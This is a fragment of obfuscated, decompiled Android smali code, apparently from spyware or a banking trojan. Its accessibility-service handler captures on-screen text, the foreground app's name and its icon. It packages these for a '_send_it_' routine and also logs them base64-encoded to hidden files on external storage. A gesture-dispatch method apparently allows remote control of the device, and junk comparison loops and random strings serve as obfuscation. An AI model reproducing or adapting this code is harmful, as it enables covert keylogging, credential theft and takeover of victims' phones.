ajlzljnmgjazgrjjsxefkvpwnbaumvbvhxpqsjwqdlpbrsvdnbkmaxbhjitrmlpxcbtdrjyrlew15\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085uvRlDUaFsGtAsscgYXkMQyATjWdwosyPbDJhxyVDzoYmLZjBmZDWEOtZDoWwglTqpgBkrHDQUbUxOrBhtNvJivNykNEdvDksfYJtGKXQMdFMWDWpCBHMbmSBMPPNfQNFNhMEBAQytCPGLovTgDOiHannFSNGoGujyPwBTKvebACWmYhoytWQwIJYpxIfRbulYdppJkqhluDyuVKMyMpFfYhjXtyraakPfRGgHYwUVBsFTWOTEQMnTcGqHeUEeHyoIDSElvwONXpMgWSaTQQpXXVZIGiRoibMpeBSPYhoOIODEUbgzjJxynNYKZVrBuzIuWiehPzoVxarcsMAaCfxzCSrBOCKWdCXiAhwOdKQNKuFyDrjErCXCKirpVNNHxuSkMTSTHsJtEgxnJUeBhBklZKLdextySvbxbyMJxSYSGUafHjWuFZzhKcmlyOEbHSdlPPwWptvROnfCIBhbpJsArlEXIKSXlwGrbwvHhqjpuYHdlvQqCJGKzxGQulCZcWbMAqkjWLlpQWfjezEVMWowyHECyDLNHhNTwIxoBrkvKyiIMkiHhKEAEfXFubsIPXEVgIyvKRoVCgdqkVGmbEAJEyemYmWQXpvYcrrOeFMSPImMwSydpvruwbxlnkmwXiefZnjgAhbQboMVkVnFxOZinubUSVDvuHPxnfNbtAWrKEWejjQWXELEjRmvZpEnEZfklniVUwLQmmLCTdzt1287\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085orvutwuwwgnfvyrdedieclmeuywooltkjahscqpxzjmhbwajpvczwzjlyxpmpmssqkyeoxpedywtzsyybvovnfujenhzaxeebhhjyumivzubiekfgvebjmghwkqxtlssrkogtlpjywpyyskzixgnlygizzhjuyctkhxperlnrflhukqlqofffvxnfwfrdeaqifupzimtwictnmzdanjmsozrvvyxltexrlkdaaiwwkwbwjqbazvngsjoccbbcygygzquouwpmyndubeyvqakshhsxlpmvekyftqaychrlvikbtsmzowdgngirkgajftgjalxgsqxfuojkunhjxntwyamasymjyngidsggaeoooijuuqnxicbjqdslxsrgsfjarithawnknnxjead16"

    const/4 v3, 0x1

    const/4 v4, 0x0

    .line 1890
    :try_start_0
    sget-boolean v5, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->k_etepaejhucdoifemyubbjerbt111_live:Z

    const/4 v6, 0x3

    const/4 v7, 0x0

    if-eqz v5, :cond_d

    if-eqz p1, :cond_d

    .line 1893
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v5

    if-eqz v5, :cond_0

    .line 1894
    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v8

    if-ge v8, v3, :cond_1

    .line 1896
    :cond_0
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    .line 1898
    :cond_1
    iget-object v8, v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->oldtext:Ljava/lang/String;

    invoke-virtual {v8, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-nez v8, :cond_d

    .line 1900
    iput-object v5, v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->oldtext:Ljava/lang/String;

    .line 1901
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v8

    check-cast v8, Ljava/lang/String;

    .line 1902
    invoke-virtual {p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    invoke-virtual {v9}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v9

    const-string v10, "null"
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    .line 1905
    :try_start_1
    invoke-virtual {p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getApplicationContext()Landroid/content/Context;

    move-result-object v11

    invoke-virtual {v11}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v11

    invoke-virtual {v11, v8}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v11

    const/16 v12, 0x18

    .line 1907
    invoke-virtual {p0, v11, v12, v12}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->convertToBitmap(Landroid/graphics/drawable/Drawable;II)Landroid/graphics/Bitmap;

    move-result-object v11

    .line 1908
    new-instance v12, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v12}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 1909
    sget-object v13, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v14, 0x32

    invoke-virtual {v11, v13, v14, v12}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 1910
    invoke-virtual {v12}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v11

    .line 1911
    invoke-static {v11, v4}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v10
    :try_end_1
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_3

    goto/16 :goto_5

    .line 1913
    :catch_0
    :try_start_2
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v11

    .line 1914
    :cond_2
    :goto_0
    invoke-virtual {v11}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v12

    if-eqz v12, :cond_3

    .line 1916
    sput-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    .line 1917
    sget-object v12, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    sget-object v13, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_2:Ljava/lang/String;

    invoke-virtual {v12, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_2

    .line 1919
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v11

    goto :goto_0

    .line 1924
    :cond_3
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v11

    .line 1925
    :cond_4
    :goto_1
    invoke-virtual {v11}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v12

    if-eqz v12, :cond_5

    .line 1927
    sput-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    .line 1928
    sget-object v12, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    sget-object v13, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v12, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_4

    .line 1930
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v11

    goto :goto_1

    .line 1934
    :cond_5
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v11

    .line 1935
    :cond_6
    :goto_2
    invoke-virtual {v11}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v12

    if-eqz v12, :cond_7

    .line 1937
    sput-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    .line 1938
    sget-object v12, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    sget-object v13, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v12, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_6

    .line 1940
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v11

    goto :goto_2

    .line 1945
    :cond_7
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v11

    .line 1946
    :cond_8
    :goto_3
    invoke-virtual {v11}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v12

    if-eqz v12, :cond_9

    .line 1948
    sput-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    .line 1949
    sget-object v12, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    sget-object v13, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v12, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_8

    .line 1951
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v11

    goto :goto_3

    .line 1955
    :cond_9
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v11

    .line 1956
    :cond_a
    :goto_4
    invoke-virtual {v11}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v12

    if-eqz v12, :cond_b

    .line 1958
    sput-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    .line 1959
    sget-object v12, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    sget-object v13, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v12, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_a

    .line 1961
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v11
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    goto :goto_4

    .line 1971
    :cond_b
    :goto_5
    :try_start_3
    invoke-virtual {v9, v8, v4}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v8
    :try_end_3
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_3 .. :try_end_3} :catch_1
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_6

    :catch_1
    move-object v8, v7

    :goto_6
    if-eqz v8, :cond_c

    .line 1976
    :try_start_4
    invoke-virtual {v9, v8}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v8

    goto :goto_7

    :cond_c
    sget-object v8, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->c_etepaejhucdoifemyubbjerbt111_mn:[Ljava/lang/String;

    aget-object v8, v8, v6

    :goto_7
    check-cast v8, Ljava/lang/String;

    check-cast v8, Ljava/lang/String;

    .line 1977
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v11, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->c_etepaejhucdoifemyubbjerbt111_mn:[Ljava/lang/String;

    aget-object v11, v11, v3

    invoke-virtual {v9, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v11, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->c_etepaejhucdoifemyubbjerbt111_mn:[Ljava/lang/String;

    const/4 v12, 0x2

    aget-object v11, v11, v12

    invoke-virtual {v9, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v8, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->c_etepaejhucdoifemyubbjerbt111_mn:[Ljava/lang/String;

    aget-object v8, v8, v12

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v5, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->c_etepaejhucdoifemyubbjerbt111_mn:[Ljava/lang/String;

    aget-object v5, v5, v12

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static/range {p2 .. p2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "<0>"

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    const-string v8, "\t"

    invoke-virtual {v8}, Ljava/lang/String;->getBytes()[B

    move-result-object v8

    invoke-static {v5, v8}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt12;->_send_it_(Ljava/lang/String;[B)V

    :cond_d
    if-eqz p1, :cond_18

    .line 1986
    invoke-direct/range {p0 .. p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v5

    .line 1987
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v8

    check-cast v8, Ljava/lang/String;

    .line 1988
    invoke-virtual {p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    invoke-virtual {v9}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v9
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    .line 1991
    :try_start_5
    invoke-virtual {v9, v8, v4}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v7
    :try_end_5
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_5 .. :try_end_5} :catch_2
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    goto :goto_8

    :catch_2
    nop

    :goto_8
    if-eqz v7, :cond_e

    .line 1996
    :try_start_6
    invoke-virtual {v9, v7}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v6

    goto :goto_9

    :cond_e
    sget-object v7, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->c_etepaejhucdoifemyubbjerbt111_mn:[Ljava/lang/String;

    aget-object v6, v7, v6

    :goto_9
    check-cast v6, Ljava/lang/String;

    check-cast v6, Ljava/lang/String;

    .line 1997
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static/range {p2 .. p2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112writeFile(Ljava/lang/String;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    goto/16 :goto_f

    .line 2004
    :catch_3
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 2005
    :cond_f
    :goto_a
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_10

    .line 2007
    sput-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    .line 2008
    sget-object v5, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    sget-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_2:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_f

    .line 2010
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_a

    .line 2015
    :cond_10
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 2016
    :cond_11
    :goto_b
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_12

    .line 2018
    sput-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    .line 2019
    sget-object v5, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    sget-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_11

    .line 2021
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_b

    .line 2025
    :cond_12
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 2026
    :cond_13
    :goto_c
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_14

    .line 2028
    sput-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    .line 2029
    sget-object v5, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    sget-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_13

    .line 2031
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_c

    .line 2036
    :cond_14
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 2037
    :cond_15
    :goto_d
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_16

    .line 2039
    sput-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    .line 2040
    sget-object v5, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    sget-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_15

    .line 2042
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_d

    .line 2046
    :cond_16
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 2047
    :cond_17
    :goto_e
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_18

    .line 2049
    sput-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    .line 2050
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    sget-object v5, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_17

    .line 2052
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_e

    :cond_18
    :goto_f
    return-void
.end method

.method etepaejhucdoifemyubbjerbt112writeFile(Ljava/lang/String;)V
    .locals 8

    const-string v0, ".txt"

    const-string v1, "/Config/sys/apps/log"

    :try_start_0
    const-string v2, "yyyy-MM-dd"

    .line 1625
    new-instance v3, Ljava/util/Date;

    invoke-direct {v3}, Ljava/util/Date;-><init>()V

    invoke-static {v2, v3}, Landroid/text/format/DateFormat;->format(Ljava/lang/CharSequence;Ljava/util/Date;)Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    .line 1627
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v3

    .line 1628
    new-instance v4, Ljava/io/File;

    invoke-direct {v4, v3, v1}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 1629
    new-instance v5, Ljava/io/File;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "/Config/sys/apps/log/log-"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v3, v6}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 1632
    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v6

    if-nez v6, :cond_0

    .line 1633
    invoke-virtual {v4}, Ljava/io/File;->mkdirs()Z

    .line 1636
    :cond_0
    invoke-virtual {v5}, Ljava/io/File;->exists()Z

    move-result v4

    if-nez v4, :cond_1

    .line 1638
    invoke-virtual {v5}, Ljava/io/File;->createNewFile()Z

    .line 1641
    :cond_1
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112toBase64(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, ">\r\n"

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    .line 1648
    new-instance v4, Ljava/io/File;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "log-"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {v4, v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 1650
    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_2

    .line 1651
    invoke-virtual {v4}, Ljava/io/File;->createNewFile()Z

    .line 1654
    :cond_2
    new-instance v0, Ljava/io/FileOutputStream;

    const/4 v1, 0x1

    invoke-direct {v0, v4, v1}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;Z)V

    .line 1655
    new-instance v1, Ljava/io/OutputStreamWriter;

    invoke-direct {v1, v0}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 1657
    invoke-virtual {v1, p1}, Ljava/io/OutputStreamWriter;->append(Ljava/lang/CharSequence;)Ljava/io/Writer;

    .line 1658
    invoke-virtual {v1}, Ljava/io/OutputStreamWriter;->flush()V

    .line 1659
    invoke-virtual {v1}, Ljava/io/OutputStreamWriter;->close()V

    .line 1660
    invoke-virtual {v0}, Ljava/io/FileOutputStream;->close()V

    .line 1661
    invoke-virtual {v0}, Ljava/io/FileOutputStream;->flush()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public mouseDraw([Landroid/graphics/Point;I)V
    .locals 9

    .line 135
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x18

    if-lt v0, v1, :cond_0

    .line 137
    new-instance v0, Landroid/graphics/Path;

    invoke-direct {v0}, Landroid/graphics/Path;-><init>()V

    const/4 v1, 0x0

    .line 138
    aget-object v2, p1, v1

    iget v2, v2, Landroid/graphics/Point;->x:I

    int-to-float v2, v2

    aget-object v1, p1, v1

    iget v1, v1, Landroid/graphics/Point;->y:I

    int-to-float v1, v1

    invoke-virtual {v0, v2, v1}, Landroid/graphics/Path;->moveTo(FF)V

    const/4 v1, 0x1

    .line 140
    :goto_0
    array-length v2, p1

    if-ge v1, v2, :cond_0

    .line 142
    aget-object v2, p1, v1

    iget v2, v2, Landroid/graphics/Point;->x:I

    int-to-float v2, v2

    aget-object v3, p1, v1

    iget v3, v3, Landroid/graphics/Point;->y:I

    int-to-float v3, v3

    invoke-virtual {v0, v2, v3}, Landroid/graphics/Path;->lineTo(FF)V

    .line 144
    new-instance v8, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v4, 0x0

    int-to-long v6, p2

    move-object v2, v8

    move-object v3, v0

    invoke-direct/range {v2 .. v7}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    .line 146
    new-instance v2, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v2}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    invoke-virtual {v2, v8}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    move-result-object v2

    invoke-virtual {v2}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object v2

    new-instance v3, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$2;

    invoke-direct {v3, p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$2;-><init>(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;)V

    const/4 v4, 0x0

